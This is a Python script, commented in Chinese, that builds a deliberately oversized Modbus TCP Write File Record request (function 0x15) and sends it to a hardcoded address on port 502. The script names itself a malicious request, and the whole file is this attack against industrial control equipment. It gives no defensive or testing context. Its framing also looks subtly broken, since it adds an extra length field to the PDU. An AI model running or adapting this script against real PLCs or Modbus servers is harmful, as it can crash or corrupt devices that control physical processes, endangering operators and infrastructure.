import socket
import struct
import logging

logging.basicConfig(level=logging.DEBUG)

def send_malicious_modbus_request():
    try:
        # 設定參數
        reference_type = 6
        file_number = 0
        record_number = 0
        record_length = 0xFFFE  # 設置超過正常範圍的長度
        record_data = b'\x00' * (record_length * 2)  # 記錄數據長度為 record_length * 2

        # 構建文件記錄數據
        file_record_header = bytearray()
        file_record_header.extend(reference_type.to_bytes(1, 'big'))
        file_record_header.extend(file_number.to_bytes(2, 'big'))
        file_record_header.extend(record_number.to_bytes(2, 'big'))
        file_record_header.extend(record_length.to_bytes(2, 'big'))

        # 注意：如果 record_data 超過 65535 字節，應進行適當處理
        if len(record_data) > 65535:
            record_data = record_data[:65535]  # 限制為最大範圍

        file_record = file_record_header + record_data

        # 構建 Modbus PDU
        modbus_pdu_header = bytearray()
        modbus_pdu_header.extend((0x15).to_bytes(1, 'big'))  # 功能碼 0x15
        pdu_length = len(file_record)  # 長度計算
        if pdu_length > 65535:
            logging.warning('PDU length exceeds maximum value; truncating to 65535')
            pdu_length = 65535
        modbus_pdu_header.extend(struct.pack('!H', pdu_length))  # PDU 長度
        modbus_pdu = modbus_pdu_header + file_record

        # 構建 Modbus ADU
        modbus_adu_header = bytearray()
        modbus_adu_header.extend((1).to_bytes(2, 'big'))  # Transaction ID
        modbus_adu_header.extend((0).to_bytes(2, 'big'))  # Protocol ID
        adu_length = len(modbus_pdu)  # 長度計算
        if adu_length > 65535:
            logging.warning('ADU length exceeds maximum value; truncating to 65535')
            adu_length = 65535
        modbus_adu_header.extend(struct.pack('!H', adu_length))  # Length (PDU 長度)
        modbus_adu_header.extend((1).to_bytes(1, 'big'))  # Unit ID
        modbus_request = modbus_adu_header + modbus_pdu

        # 使用 socket 發送請求
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('10.103.152.8', 502))
            logging.info("Connected to server.")

            s.sendall(modbus_request)  # 使用 sendall 確保所有數據被發送
            logging.debug('Sent malicious Modbus request: %s', repr(modbus_request))

            response = s.recv(1024)
            logging.debug('Received response: %s', repr(response))

            logging.info("Connection closed.")
    except Exception as e:
        logging.error("Error in client communication: %s", e)

if __name__ == "__main__":
    send_malicious_modbus_request()
